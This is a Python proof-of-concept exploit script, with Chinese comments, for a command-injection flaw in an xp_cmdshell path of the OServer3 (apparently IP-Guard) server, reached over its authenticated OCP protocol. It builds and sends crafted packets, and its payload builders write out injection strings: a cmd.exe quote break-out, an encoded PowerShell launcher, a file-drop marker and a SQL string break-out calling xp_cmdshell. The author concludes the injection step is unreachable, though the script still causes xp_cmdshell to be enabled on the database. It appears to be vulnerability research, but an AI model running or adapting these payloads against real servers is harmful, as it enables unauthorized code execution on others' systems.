"""poc_vuln_e_rce.py — VULN-E xp_cmdshell 注入触达验证 PoC (详细版)

==============================================================================
重要结论 (基于 sub_14000A420 / sub_140A74BC0 反编译):
==============================================================================
sub_140A74BC0 (MSSQLDBData.cpp:3185-3301) 的设计存在一个 wrapper bug:

  Step 1: EXEC sp_configure N'xp_cmdshell', 1\\nRECONFIGURE WITH OVERRIDE
          - 通过 sub_14000A420(..., a5=0) 提交
          - 该 wrapper 用 (*a1)[1] != 0 (recordset 槽非空) 判定成功
          - sp_configure / RECONFIGURE 不返回 recordset
          - => wrapper 永远返回 0 => errno=5173 提前返回

  Step 2: EXEC xp_cmdshell N'... "<a2>{guid}.txt" ...' (注入点在 a2/路径)
          - 此 SQL 末尾有 SELECT @result, 返回 recordset
          - 如能到达, wrapper 会成功返回
          - 但 step 1 已 bail, Step 2 不可达

结论: 此代码路径下 VULN-E 在任何环境都不可触达 RCE。
      Step 1 的 sp_configure SQL 在 SQL Server 上实际会执行 (wrapper 误判),
      但 Step 2 的 xp_cmdshell + 注入 SQL 完全不会执行。

==============================================================================
本 PoC 的目的:
==============================================================================
1) 证明 cmd=0x4014/sub=6 + sub6-style body 能触达 sub_140A74BC0 函数入口
2) 证明用户输入路径被拼接进 Step 2 的 SQL 模板字符串 (虽不执行)
3) 通过 errno fingerprint 区分到达哪个内部分支
4) 不修改 OServer3 二进制 — 仅用合法 OCP 协议探测

用法:
    python3 poc_vuln_e_rce.py <host> <port> <user> <pwd> [payload_kind]

payload_kind:
    test  - 良性路径 (默认), 仅触达性测试
    cmd   - cmd.exe & 注入 (若 step 2 可达会跑 calc.exe)
    sql   - SQL string break-out 注入
    ps    - powershell -enc base64 隐蔽载荷
    drop  - 写文件落地证据 (C:\\Windows\\Temp\\IPGuard_VULN_E.txt)

errno 解读:
    0/64    - SUCCESS (xp_cmdshell 真跑了 — 现实不会出现, 因 wrapper bug)
    5173    - step 1 失败 (wrapper recordset 判定 bug 触发) ← 永远是这个
    5153    - step 2 跑了但 xp_cmdshell 返回非 0 (路径权限/语法问题)
    5152    - 连接串含 Integrated Security=*, 跳过整个 xp_cmdshell 路径
    5151    - SERVERPROPERTY('InstanceName') 或 regread 失败
    5150    - SQL Server 版本 < 11.0
    5170    - 输入路径 NULL/过短

测试后 SSMS 端验证 Step 1 是否实际跑过:
    -- 先把 xp_cmdshell 关掉再跑 PoC, 然后查这个:
    SELECT name, value, value_in_use FROM sys.configurations
    WHERE name IN ('xp_cmdshell','show advanced options');
    -- 如果 value_in_use 都变 1, 说明 OServer3 的 Step 1 SQL 真跑了
    -- (即便它自己返回 errno=5173)
"""
import os, socket, struct, sys, time, base64
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)

# -------- errno fingerprint table (来自 sub_140A74BC0 反编译) --------
ERRNO_MEANING = {
    0:    ("SUCCESS",         "xp_cmdshell 跑成功 (现实因 wrapper bug 不可能)"),
    64:   ("SUCCESS-variant", "xp_cmdshell 跑成功 (现实因 wrapper bug 不可能)"),
    5150: ("ENV-BAD",         "SQL Server 版本 < 11.0, VULN-E 不可达"),
    5151: ("META-FAIL",       "SERVERPROPERTY/regread 失败, 触达但环境异常"),
    5152: ("INT-SEC",         "连接串含 Integrated Security=*, 跳过 xp_cmdshell 路径"),
    5153: ("STEP2-FAIL",      "Step 2 xp_cmdshell 跑了但返回非 0 (注入语法/权限问题) - 现实不会到这"),
    5170: ("INPUT-BAD",       "输入路径 NULL 或过短"),
    5173: ("STEP1-WRAPPER-BUG", "Step 1 sp_configure wrapper 误判 (SQL 实际跑了, 但函数早返回)"),
}

ERRCODE_LOCATION = {
    3133: "MSSQLDBData.cpp ~3197 (input check)",
    3185: "MSSQLDBData.cpp ~3204 (version check)",
    3203: "MSSQLDBData.cpp ~3199 (InstanceName query)",
    3225: "MSSQLDBData.cpp ~3219 (xp_instance_regread)",
    3242: "MSSQLDBData.cpp ~3236 (Integrated Security branch)",
    3270: "MSSQLDBData.cpp ~3258 (sp_configure xp_cmdshell=1)",
    3301: "MSSQLDBData.cpp ~3294 (xp_cmdshell exec - Step 2)",
}


def fresh_send(host, port, user, pwd, cmd, sub, body,
               flags=0x4600, timeout=10.0, verbose=True):
    """独立连接 + 登录 + 单包发送 + 接响应。
    所有失败都返回 dict (含 _err 键), 永不抛异常。"""
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        idx, role, tok, _ = replay_login(s, user, pwd, base_nonce,
                                         show_crypto=False, verbose=False)
        if verbose:
            print(f"    [+] login OK (role={role} tok=0x{tok:x})")
        nxt = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=nxt,
            sess_state_16_24=struct.pack("<II", role, tok),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body)
        if verbose:
            print(f"    [+] sending {len(pkt)}B packet (cmd=0x{cmd:04x} sub=0x{sub:x} "
                  f"flags=0x{flags:04x} body={len(body)}B)")
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s))
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": f"recv: {e}"}
    except Exception as e:
        return {"_err": f"send: {e}"}
    finally:
        if s:
            try: s.close()
            except: pass


def body_sub6(path: str, v56=1, v57=1) -> bytes:
    """sub6-style body: DWORD reserved=1 + WORD wcs_len + WORD 0 + wcs + NUL + DWORD v56 + DWORD v57"""
    wcs = path.encode("utf-16-le")
    L = len(wcs) // 2
    return (struct.pack("<IHH", 1, L, 0) + wcs + b"\x00\x00"
            + struct.pack("<II", v56, v57))


def parse_vuln_e_response(resp):
    """解析 sub_140A74BC0 的输出 struct (a3 指向的 64B 结构)。
    布局:
       +0   DWORD status   (16 = 早期失败, 48 = 后期失败, 0 = 成功)
       +4   DWORD errno    (5150..5173, 见 ERRNO_MEANING)
       +8   DWORD desc_len (UTF-16 字符数)
       +12  wchar_t desc[desc_len]
       +(12+2*desc_len)  DWORD errcode (3133..3301, 见 ERRCODE_LOCATION)
    """
    if not resp or "_err" in resp:
        return None
    plain = resp.get("plain", b"")
    if not isinstance(plain, bytes) or len(plain) < 12:
        return None

    status   = struct.unpack("<I", plain[0:4])[0]
    errno_   = struct.unpack("<I", plain[4:8])[0]
    desc_len = struct.unpack("<I", plain[8:12])[0]

    desc = ""
    if desc_len and len(plain) >= 12 + 2 * desc_len:
        try:
            desc = plain[12:12 + 2 * desc_len].decode("utf-16-le", errors="replace")
        except Exception:
            pass

    errcode = 0
    code_off = 12 + 2 * desc_len
    if len(plain) >= code_off + 4:
        errcode = struct.unpack("<I", plain[code_off:code_off + 4])[0]

    return {
        "status":   status,
        "errno":    errno_,
        "errcode":  errcode,
        "desc":     desc,
        "desc_len": desc_len,
        "raw_hex":  plain.hex(),
    }


def make_payload(kind: str) -> str:
    """生成放进 Step 2 SQL 模板的 path 字符串。

    Step 2 SQL 模板 (固定):
        EXEC @result = xp_cmdshell N'type nul > "<path>{guid}.txt"', NO_OUTPUT
        IF @result = 0 BEGIN
          EXEC @result = xp_cmdshell N'cacls.exe "<path>{guid}.txt" /e /g everyone:F', NO_OUTPUT
          EXEC xp_cmdshell N'del "<path>{guid}.txt"', NO_OUTPUT
        END
        SELECT @result

    注: 实际 SQL 中 <path> 周围有双引号包裹 ("<path>{guid}.txt")。
    所以 cmd.exe 的命令行被引号截断, 我们的 payload 需用 " 关闭引号后接 & .
    """
    if kind == "test":
        return r"C:"
        #return r""

    elif kind == "cmd":
        # 关闭外层引号 -> & calc.exe & echo 重开引号让后续 SQL 不破
        # 注入后第一条 cmdline: type nul > "C:\t" & calc.exe & echo "{guid}.txt"
        return r'C:\t" & calc.exe & echo "'

    elif kind == "drop":
        # 落地文件证据 — 不依赖任何外部程序, echo 是 cmd 内建
        return r'C:\t" & echo OWNED-by-VULN-E > C:\Windows\Temp\IPGuard_VULN_E.txt & echo "'

    elif kind == "ps":
        ps_cmd = 'Start-Process calc.exe'
        ps_b64 = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
        return rf'C:\t" & powershell -enc {ps_b64} & echo "'

    elif kind == "sql":
        # SQL string break-out — 关闭 N'...' 后注入新 SQL 语句
        # 注: 模板里 path 进入 N'cacls.exe %s ...' 的 %s,
        # 我们的字符串里的单引号会被当作 SQL 字符串闭合
        return r"test'; EXEC xp_cmdshell 'calc.exe'--"

    elif kind == "long":
        # 测试边界 — 极长路径看有没有溢出
        return "C:\\" + "A" * 2000

    elif kind == "wide":
        # 测试非 ASCII 处理
        return "C:\\路径注入测试"

    # ---- 字符过滤探测 (相比 'test' 基线只多 1 个特殊字符) ----
    elif kind == "amp":
        # 单 & 测试 — dispatcher 是否过滤 &?
        return r"C:\OServer3&TEST"
    elif kind == "quote":
        # 单 " 测试 — dispatcher 是否过滤 "?
        return r'C:\OServer3"TEST'
    elif kind == "squote":
        # 单 ' 测试 — dispatcher 是否过滤 ' (SQL 字符串闭合用)?
        return r"C:\OServer3'TEST"
    elif kind == "pipe":
        # 单 | 测试
        return r"C:\OServer3|TEST"
    elif kind == "semi":
        # 单 ; 测试
        return r"C:\OServer3;TEST"
    elif kind == "space":
        # 单空格测试 — 看是否被 trim
        return r"C:\OServer3 TEST"
    elif kind == "noquote-cmd":
        # 无 " 的命令注入尝试 (path 末尾没有 " 重开,看后续 SQL 是否还能解析)
        # 模板: type nul > "C:\t & calc.exe & echo {guid}.txt"  ← cmd.exe 在引号内的 & 不分隔
        # 所以无 " 注入不可行, 但可探测是否能到 step 2
        return r"C:\t & calc.exe"
    elif kind == "tab":
        # tab 字符测试
        return "C:\\OServer3\tTEST"
    elif kind == "null":
        # 嵌入 NUL 测试 — 会被 wcslen 截断为前缀
        return "C:\\OServer3\x00TEST"

    else:
        raise ValueError(f"unknown payload kind: {kind!r}")


def explain_result(info):
    """根据解析后的 info 输出人话诊断。"""
    if not info:
        print("\n[!] 无法解析响应 — 服务可能拒绝、超时, 或这是另一个 handler")
        return

    print(f"\n{'='*70}")
    print(f"sub_140A74BC0 output struct:")
    print(f"{'='*70}")
    print(f"  status   = {info['status']:>6}  (16=早期失败, 48=后期失败, 0=成功)")
    label, hint = ERRNO_MEANING.get(info['errno'], ("UNKNOWN", "?"))
    print(f"  errno    = {info['errno']:>6}  [{label}] {hint}")
    loc = ERRCODE_LOCATION.get(info['errcode'], "?")
    print(f"  errcode  = {info['errcode']:>6}  @ {loc}")
    print(f"  desc_len = {info['desc_len']}")
    if info['desc']:
        # 截断显示
        d = info['desc'][:200]
        print(f"  desc     = {d!r}")
        if len(info['desc']) > 200:
            print(f"             (truncated, total {len(info['desc'])} chars)")
    print()

    # 核心诊断
    if info['errno'] in (0, 64):
        print(f"  🎯🎯🎯 RCE SUCCESS — xp_cmdshell 真跑了!")
        print(f"        现实中你不应该看到这个 (wrapper bug 阻止)")
        print(f"        如果看到了, 说明 wrapper 行为与静态分析不符, 复核 sub_14000A420")
    elif info['errno'] == 5173:
        print(f"  ℹ️  到达 Step 1 wrapper bug 分支 (预期):")
        print(f"      OServer3 提交了 sp_configure SQL, SQL Server 实际执行了,")
        print(f"      但 wrapper 因 sp_configure 不返回 recordset 而误判失败。")
        print(f"      Step 2 (注入点) 不会执行。")
        print(f"      你的路径 payload 已被拼进 Step 2 的 SQL 字符串 (desc 里能看到),")
        print(f"      但 SQL 没机会跑。")
    elif info['errno'] == 5153:
        print(f"  ⚠️  到达 Step 2 — xp_cmdshell 执行了, 但返回非 0")
        print(f"      理论上不可能 (Step 1 永远卡), 除非 OServer3 版本不同 / wrapper 行为变化")
        print(f"      如果是这样, 检查 C:\\Windows\\Temp\\IPGuard_VULN_E.txt")
    elif info['errno'] == 5152:
        print(f"  ℹ️  连接串含 Integrated Security=*, OServer3 跳过整个 xp_cmdshell 流程")
    elif info['errno'] in (5150, 5151):
        print(f"  ℹ️  环境/版本问题, 触达但提前 bail")
    elif info['errno'] == 5170:
        print(f"  ℹ️  路径过短被拒")
    else:
        print(f"  ❓ 未列入 fingerprint 的 errno, 可能是别的函数响应")


def print_ssms_verify_queries():
    print(f"\n{'='*70}")
    print(f"SSMS 端验证 — 在 SQL Server 上跑下面查询确认 Step 1 真跑了:")
    print(f"{'='*70}")
    print("""
  -- 1) 重置 xp_cmdshell 关闭, 然后再跑 PoC, 再查这个
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

  -- 2) 跑 PoC 之后查 — 如果变回 1, 说明 OServer3 的 Step 1 SQL 真跑了
  SELECT name, value, value_in_use FROM sys.configurations
   WHERE name IN ('xp_cmdshell','show advanced options');

  -- 3) 开 Profiler 抓 OServer3 -> SQL 的实际 TDS 流量更直观
  --    Trace -> Stored Procedures -> RPC:Completed + SQL:BatchCompleted
""")


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd  = sys.argv[3], sys.argv[4]
    kind       = sys.argv[5] if len(sys.argv) >= 6 else "test"

    path = make_payload(kind)
    body = body_sub6(path, v56=1, v57=1)

    print(f"{'='*70}")
    print(f"VULN-E RCE 触达 PoC (详细版)")
    print(f"{'='*70}")
    print(f"[*] target     {host}:{port}")
    print(f"[*] user       {user!r}")
    print(f"[*] payload    kind={kind}")
    print(f"[*] path       {path!r}")
    print(f"[*]            (utf-16-le, {len(path)} chars, {len(path)*2} bytes)")
    print(f"[*] body       {len(body)}B")
    print(f"[*] body.hex   {body.hex()[:120]}{'...' if len(body.hex())>120 else ''}")
    print()
    print(f"[*] OCP cmd=0x4014 sub=0x6 flags=0x4600")
    print(f"[*] 期待路径: ConsoleDisposal -> sub_140475770 -> sub_140A74BC0")
    print(f"[*] 期待 errno: 5173 (Step 1 wrapper bug, 由静态分析推定)")
    print()

    t0 = time.time()
    resp = fresh_send(host, port, user, pwd, 0x4014, 0x6, body,
                      flags=0x4600, verbose=True)
    dt = time.time() - t0

    print(f"\n[*] elapsed {dt:.2f}s")
    print(f"[*] response keys: {list(resp.keys()) if resp else None}")
    if resp and "_err" in resp:
        print(f"[!] error: {resp['_err']}")
        return 1

    fl   = resp.get("flags", 0)
    plen = resp.get("payload_len", 0)
    plain = resp.get("plain", b"")
    print(f"[*] resp.flags        = 0x{fl:04x}")
    print(f"[*] resp.payload_len  = {plen}")
    print(f"[*] resp.plain length = {len(plain)}")
    print(f"[*] resp.plain hex    = {plain[:80].hex()}{'...' if len(plain)>80 else ''}")

    info = parse_vuln_e_response(resp)
    explain_result(info)

    if kind in ("drop", "cmd", "ps") and info and info["errno"] in (0, 64):
        print(f"\n[!] payload kind={kind} — 检查目标机:")
        if kind == "drop":
            print("    Get-Item C:\\Windows\\Temp\\IPGuard_VULN_E.txt")
        elif kind == "cmd":
            print("    Get-Process calc")
        elif kind == "ps":
            print("    Get-Process powershell, calc")

    print_ssms_verify_queries()
    return 0


if __name__ == "__main__":
    sys.exit(main())
